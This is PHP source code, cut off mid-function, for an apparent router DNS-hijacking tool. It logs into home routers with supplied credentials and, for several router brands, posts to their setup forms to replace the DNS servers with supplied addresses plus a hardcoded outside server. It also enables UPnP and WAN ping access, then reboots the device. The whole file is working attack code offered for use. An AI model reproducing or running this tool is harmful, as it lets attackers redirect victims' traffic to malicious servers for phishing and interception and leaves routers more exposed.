<?php

class GoAhed
{
	private $ch;
	private $Host;
	private $User;
	private $Pass;
	private $Title;
	private $Result;
	function __construct()
	{
		$this->ch = curl_init();
	}
	
	private function GetStr($string, $start, $end)
	{
		$string = ' ' . $string;
		$ini = strpos($string, $start);
		if ($ini == 0) return '';
		$ini += strlen($start);
		$len = strpos($string, $end, $ini) - $ini;
		return substr($string, $ini, $len);
	}	
	
	public function Login($Host,$User,$Pass)
	{
	    @unlink("cookies.txt");
		$this->ch = curl_init();
		curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/");
		curl_setopt($this->ch, CURLOPT_HEADER, 1);
		curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($this->ch, CURLOPT_CUSTOMREQUEST, "GET");
		curl_setopt($this->ch, CURLOPT_USERPWD, $User. ":" . $Pass);
		curl_setopt($this->ch, CURLOPT_COOKIEJAR, "cookies.txt");
        curl_setopt($this->ch, CURLOPT_CONNECTTIMEOUT ,8);
        curl_setopt($this->ch, CURLOPT_TIMEOUT, 8);
		$headers = array();
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "Referer: http://{$Host}/";
		$headers[] = "Cookie: "."Authorization=Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Connection: keep-alive";
		curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
		$result = curl_exec($this->ch);
		echo $result;
		$Status = (strpos($result,"401") == false) ? true : false;
		if ($Status)
		{
			echo "[*] Title: ".$this->GetTitle($Host,$User,$Pass);
			$this->Title = $this->GetTitle($Host,$User,$Pass);
		}
		return $Status;
	}
	
	private function GetTitle($Host,$User,$Pass)
	{
		$this->ch = curl_init();
		curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/home.asp");
		curl_setopt($this->ch, CURLOPT_HEADER, 1);
		curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($this->ch, CURLOPT_CUSTOMREQUEST, "GET");
		curl_setopt($this->ch, CURLOPT_USERPWD, $User. ":" . $Pass);
		curl_setopt($this->ch, CURLOPT_COOKIEFILE, "cookies.txt");
		$headers = array();
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "Referer: http://{$Host}/";
		$headers[] = "Cookie: "."Authorization=Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Connection: keep-alive";
		curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
		$result = curl_exec($this->ch);
		$result =  str_replace("<TITLE>","<title>",$result);
		$result =  str_replace("</TITLE>","</title>",$result);
		$this->Result = $result;echo $result;
		$Title =  $this->GetStr($result,'<title>','</title>');
		return $Title;
	
	}
	private function OiwTech($Host,$User,$Pass,$DNS1,$DNS2)
	{
		$this->ch = curl_init();
		curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/tcpipwan.asp");
		curl_setopt($this->ch, CURLOPT_HEADER, 1);
		curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($this->ch, CURLOPT_USERPWD, $User. ":" . $Pass);
		curl_setopt($this->ch, CURLOPT_COOKIEJAR, "cookies.txt");
		$headers = array();
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		//$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
		$result = curl_exec($this->ch);
		echo $result;
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formWanTcpipSetup");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "dnsMode=dnsManual&dns1={$DNS1}&dns2={$DNS2}&dns3=107.155.152.15&wan_macAddr=000000000000&upnpEnabled=ON&pingWanAccess=ON&WANPassThru1=ON&WANPassThru2=ON&WANPassThru3=ON&submit-url=%2Ftcpipwan.asp&save=Aplicar+Altera%E7%F5es");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");

		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formTools");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "reboot=Sim%2C+reinicie+o+AP%21&submit-url=%2Ftools.asp");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");
		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tools.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_close($ch);
		curl_close($this->ch);
		//echo $result;
	}
	private function WlanAPWebServer($Host,$User,$Pass,$DNS1,$DNS2)
	{
		$this->ch = curl_init();
		curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/tcpipwan.asp");
		curl_setopt($this->ch, CURLOPT_HEADER, 1);
		curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($this->ch, CURLOPT_USERPWD, $User. ":" . $Pass);
		curl_setopt($this->ch, CURLOPT_COOKIEJAR, "cookies.txt");
		$headers = array();
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		//$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
		$result = curl_exec($this->ch);
		echo $result;
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formWanTcpipSetup");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "dnsMode=dnsManual&dns1={$DNS1}&dns2={$DNS2}&dns3=107.155.152.15&wan_macAddr=000000000000&upnpEnabled=ON&pingWanAccess=ON&WANPassThru1=ON&WANPassThru2=ON&WANPassThru3=ON&submit-url=%2Ftcpipwan.asp&save=Aplicar+Altera%E7%F5es");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");

		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formTools");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "reboot=Sim%2C+reinicie+o+AP%21&submit-url=%2Ftools.asp");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");
		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tools.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_close($ch);
		curl_close($this->ch);
		//echo $result;
	}
	private function KrazerWispOS($Host,$User,$Pass,$DNS1,$DNS2)
	{
		$this->ch = curl_init();
		curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/tcpipwan.asp");
		curl_setopt($this->ch, CURLOPT_HEADER, 1);
		curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($this->ch, CURLOPT_USERPWD, $User. ":" . $Pass);
		curl_setopt($this->ch, CURLOPT_COOKIEJAR, "cookies.txt");
		$headers = array();
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		//$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
		$result = curl_exec($this->ch);
		echo $result;
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formWanTcpipSetup");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "dnsMode=dnsManual&dns1={$DNS1}&dns2={$DNS2}&dns3=107.155.152.15&wan_macAddr=000000000000&upnpEnabled=ON&pingWanAccess=ON&WANPassThru1=ON&WANPassThru2=ON&WANPassThru3=ON&submit-url=%2Ftcpipwan.asp&save=Aplicar+Altera%E7%F5es");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");

		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formRebootCheck");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "submit-url=%2Ftcpipwan.asp");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");
		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tools.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_close($ch);
		curl_close($this->ch);
		//echo $result;
	}	
	private function Elsys($Host,$User,$Pass,$DNS1,$DNS2)
	{
		$this->ch = curl_init();
		curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/tcpipwan.asp");
		curl_setopt($this->ch, CURLOPT_HEADER, 1);
		curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($this->ch, CURLOPT_USERPWD, $User. ":" . $Pass);
		curl_setopt($this->ch, CURLOPT_COOKIEJAR, "cookies.txt");
		$headers = array();
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		//$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
		$result = curl_exec($this->ch);
		echo $result;
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formWanTcpipSetup");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "dnsMode=dnsManual&dns1={$DNS1}&dns2={$DNS2}&dns3=107.155.152.15&wan_macAddr=000000000000&upnpEnabled=ON&pingWanAccess=ON&WANPassThru1=ON&WANPassThru2=ON&WANPassThru3=ON&submit-url=%2Ftcpipwan.asp&save=Aplicar+Altera%E7%F5es");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");

		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formRebootCheck");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "submit-url=%2Ftcpipwan.asp");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");
		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tools.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_close($ch);
		curl_close($this->ch);
		//echo $result;
	}
	
	private function StCom($Host,$User,$Pass,$DNS1,$DNS2)
	{
		$this->ch = curl_init();
		curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/tcpipwan.asp");
		curl_setopt($this->ch, CURLOPT_HEADER, 1);
		curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($this->ch, CURLOPT_USERPWD, $User. ":" . $Pass);
		curl_setopt($this->ch, CURLOPT_COOKIEJAR, "cookies.txt");
		$headers = array();
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		//$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
		$result = curl_exec($this->ch);
		echo $result;
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formWanTcpipSetup");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "dnsMode=dnsManual&dns1={$DNS1}&dns2={$DNS2}&dns3=107.155.152.15&wan_macAddr=000000000000&upnpEnabled=ON&pingWanAccess=ON&WANPassThru1=ON&WANPassThru2=ON&WANPassThru3=ON&submit-url=%2Ftcpipwan.asp&save=Aplicar+Altera%E7%F5es");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");

		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formRebootCheck");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "submit-url=%2Ftcpipwan.asp");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");
		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tools.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_close($ch);
		curl_close($this->ch);
		//echo $result;
	}	
	
	private function RealTek($Host,$User,$Pass,$DNS1,$DNS2)
	{
		$this->ch = curl_init();
		curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/tcpipwan.asp");
		curl_setopt($this->ch, CURLOPT_HEADER, 1);
		curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($this->ch, CURLOPT_USERPWD, $User. ":" . $Pass);
		curl_setopt($this->ch, CURLOPT_COOKIEJAR, "cookies.txt");
		$headers = array();
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		//$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
		$result = curl_exec($this->ch);
		echo $result;
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formWanTcpipSetup");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "dnsMode=dnsManual&dns1={$DNS1}&dns2={$DNS2}&dns3=107.155.152.15&wan_macAddr=000000000000&upnpEnabled=ON&pingWanAccess=ON&WANPassThru1=ON&WANPassThru2=ON&WANPassThru3=ON&submit-url=%2Ftcpipwan.asp&save=Aplicar+Altera%E7%F5es");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");

		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formRebootCheck");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "submit-url=%2Ftcpipwan.asp");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");
		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tools.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_close($ch);
		curl_close($this->ch);
		//echo $result;
	}	
	
	private function ApRouterNewGeneration($Host,$User,$Pass,$DNS1,$DNS2)
	{
		$this->ch = curl_init();
		curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/tcpipwan.asp");
